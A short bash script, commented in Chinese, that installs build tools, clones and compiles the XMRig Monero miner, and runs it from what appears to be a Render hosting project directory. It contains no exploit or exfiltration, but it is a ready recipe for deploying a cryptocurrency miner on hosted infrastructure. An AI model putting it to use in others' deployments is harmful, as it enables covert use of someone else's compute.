#!/bin/bash

# 進入儲存庫目錄
cd /opt/render/project/src/002

# 更新套件清單
sudo apt-get update

# 安裝必要的依賴
sudo apt-get install -y build-essential cmake libuv1-dev libssl-dev libhwloc-dev

# 下載 XMRig 源碼
git clone https://github.com/xmrig/xmrig.git

# 進入 XMRig 目錄
cd xmrig

# 創建並進入 build 目錄
mkdir build && cd build

# 生成 Makefile
cmake ..

# 編譯 XMRig
make

# 執行 XMRig
./xmrig --config=config.json

